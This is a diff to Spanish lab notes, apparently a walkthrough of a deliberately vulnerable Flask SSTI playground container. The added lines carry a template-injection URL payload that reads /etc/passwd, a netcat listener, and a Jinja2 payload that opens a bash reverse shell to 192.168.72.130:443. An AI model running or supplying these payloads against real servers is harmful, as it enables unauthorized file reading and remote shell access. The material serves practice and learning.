@@ -28,7 +28,21 @@ docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
  - También podemos ánilizar el tipo de lenguajes que contiene la red con `whatwep localhost:8089`
  - Podemos realizar un intento de ingresar código en el **IMPUT** para ver si nos devuelve una respuesta valida en el **OUTPUT** como `{{7*7}}`
  - Buscamos nuestro payload en nuestro Recurso de github de **Payloads All The Things** 
- ejemplo de la inye
+ ejemplo de la **Server-Side Template Injection**
+```
+http://localhost:8089/?user={{%20get_flashed_messages.__globals__.__builtins__.open(%22/etc/passwd%22).read()%20}} 
+```
+
+## Ahora si queremos obtener acceso a la maquina tendríamos que hacer lo siguiente
+
+- Nos ponemos en escucha por el puerto 443
+```
+nc -nlvp 443
+```
+
+- Y en la URL le cargamos el tipíco one liner 
+- {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/192.168.72.130/443 0>%261"').read() }}
+Y listo con esto tendríamos acceso a la maquina en nuestra terminal :)
 
 
 # Recursos 
